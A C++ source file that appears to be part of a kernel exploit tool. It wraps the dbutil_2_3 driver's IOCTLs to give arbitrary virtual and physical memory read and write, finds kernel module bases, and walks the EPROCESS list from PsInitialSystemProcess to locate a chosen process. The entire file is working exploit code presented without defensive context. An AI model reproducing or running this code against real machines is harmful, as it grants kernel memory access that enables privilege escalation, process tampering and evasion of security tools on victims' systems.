#include "stdafx.h"

Memory::Memory() {
	/* Constructor for Memory Manager */
	// Opens a handle to dbutil_2_3
	Memory::DriverHandle = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	// Checks if handle was opened succesfully
	if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
		Logger::Error("Couldn't Create Handle to Driver, Quitting...");
		Logger::ShowKeyPress();
		exit(1);
	}
	else {
		Logger::Info("Successfully Created Handle to Driver!");
	}
}

BOOL Memory::VirtualRead(_In_ DWORD64 address, _Out_ void *buffer, _In_ size_t bytesToRead) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, 0x8);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, 0x8);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, 0x8);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_VIRTUAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x18], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::VirtualWrite(_In_ DWORD64 address, _In_ void *buffer, _In_ size_t bytesToWrite) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x18], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_VIRTUAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::PhysicalRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_PHYSICAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x10], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL Memory::PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x10], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_PHYSICAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

DWORD64 Memory::GetKernelBase(_In_ std::string name) {
	/* Gets the base address (VIRTUAL ADDRESS) of a module in kernel address space */
	// Defining EnumDeviceDrivers() and GetDeviceDriverBaseNameA() parameters
	LPVOID lpImageBase[1024]{};
	DWORD lpcbNeeded{};
	int drivers{};
	char lpFileName[1024]{};
	DWORD64 imageBase{};
	// Grabs an array of all of the device drivers
	BOOL success = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);
	// Makes sure that we successfully grabbed the drivers
	if (!success)
	{
		Logger::Error("Unable to invoke EnumDeviceDrivers()!");
		return 0;
	}
	// Defining number of drivers for GetDeviceDriverBaseNameA()
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);
	// Parsing loaded drivers
	for (int i = 0; i < drivers; i++) {
		// Gets the name of the driver
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);
		// Compares the indexed driver and with our specified driver name
		if (!strcmp(name.c_str(), lpFileName)) {
			imageBase = (DWORD64)lpImageBase[i];
			Logger::InfoHex("Found Image Base for " + name, imageBase);
			break;
		}
	}
	return imageBase;
}

DWORD64 Memory::GetEPROCESSPointer(_In_ DWORD64 ntoskrnlBase, _In_ std::string processName) {
	/* Returns the pointer (VIRTUAL ADDRESS) to an EPROCESS struct for a specified process name*/
	// Gets PsInitialSystemProcess address from ntoskrnl exports
	// Maps the ntoskrnl file to memory
	HANDLE handleToFile = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE handleToMap = CreateFileMapping(handleToFile, NULL, PAGE_READONLY, 0, 0, NULL);
	PBYTE srcFile = (PBYTE)MapViewOfFile(handleToMap, FILE_MAP_READ, 0, 0, 0);
	if (!srcFile) {
		Logger::Error("Failed to open ntoskrnl!");
		return NULL;
	}
	// Gets the DOS header from the file map
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)srcFile;
	// Gets the NT header from the dos header
	IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64 *)((PBYTE)dosHeader + dosHeader->e_lfanew);
	// Gets the Exports data directory information
	IMAGE_DATA_DIRECTORY* exportDirInfo = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// Gets the first section data header to start iterating through
	IMAGE_SECTION_HEADER* firstSectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	// Loops Through Each Section to find export table
	DWORD64 PsIntialSystemProcessOffset{};
	for (DWORD i{}; i < ntHeader->FileHeader.NumberOfSections; i++) {
		auto section = &firstSectionHeader[i];
		// Checks if our export address table is within the given section
		if (section->VirtualAddress <= exportDirInfo->VirtualAddress && exportDirInfo->VirtualAddress < (section->VirtualAddress + section->Misc.VirtualSize)) {
			// If so, put the export data in our variable and exit the for loop
			IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)dosHeader + section->PointerToRawData + (DWORD64)exportDirInfo->VirtualAddress - section->VirtualAddress);
			// Iterates through the names to find the PsInitialSystemProcess export
			DWORD* funcNames = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfNames + section->PointerToRawData - section->VirtualAddress);
			DWORD* funcAddresses = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfFunctions + section->PointerToRawData - section->VirtualAddress);
			WORD* funcOrdinals = (WORD*)((PBYTE)srcFile + exportDirectory->AddressOfNameOrdinals + section->PointerToRawData - section->VirtualAddress);
			for (DWORD j{}; j < exportDirectory->NumberOfNames; j++) {
				LPCSTR name = (LPCSTR)(srcFile + funcNames[j] + section->PointerToRawData - section->VirtualAddress);
				if (!strcmp(name, "PsInitialSystemProcess")) {
					PsIntialSystemProcessOffset = funcAddresses[funcOrdinals[j]];
					break;
				}
			}
			break;
		}
	}
	// Checks if we found the offset
	if (!PsIntialSystemProcessOffset) {
		Logger::Error("Failed to find PsInitialSystemProcess offset!");
		return NULL;
	}
	// Reads the PsInitialSystemProcess Address
	DWORD64 initialSystemProcess{};
	this->VirtualRead(ntoskrnlBase + PsIntialSystemProcessOffset, &initialSystemProcess, sizeof(DWORD64));
	if (!initialSystemProcess) {
		Logger::Error("Failed to VirtualRead PsInitialSystemProcess offset!");
		return NULL;
	}
	// Reads ActiveProcessLinks of the system process to iterate through all processes
	LIST_ENTRY activeProcessLinks;
	this->VirtualRead(initialSystemProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
	// Prepares input string for search algorithm below
	const char* inputName = processName.c_str();
	// Sets up a current process tracker as we iterate through all of the processes
	DWORD64 currentProcess{};
	UCHAR currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// Loops through the process list three times to find the PID we're looking for
	for (DWORD i{}; i < 3; i++) {
		do {
			// Initializes the currentProcess tracker with the process that comes after System
			this->VirtualRead((DWORD64)activeProcessLinks.Flink, &currentProcess, sizeof(DWORD64));
			// Subtracts the offset of the activeProcessLinks offset as an activeProcessLink
			// points to the activeProcessLinks of another EPROCESS struct
			currentProcess -= EPROCESS_ACTIVEPROCESSLINKS;
			// Gets the Name of currentProcess
			this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, sizeof(currentProcessName));
			// Checks if the currentProcess is the one we're looking for
			Logger::InfoHex((const char*)currentProcessName, strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE));
			if (strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
				// If it is the process, return the pointer to the EPROCESS struct
				return currentProcess;
			}
			// If not, update the activeProcessLinks entry with the list entry from currentprocess
			this->VirtualRead(currentProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
		} while (strncmp((const char*)currentProcessName, SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
	}
	// Will return NULL if the process is not found after 3 iterations
	return NULL;
}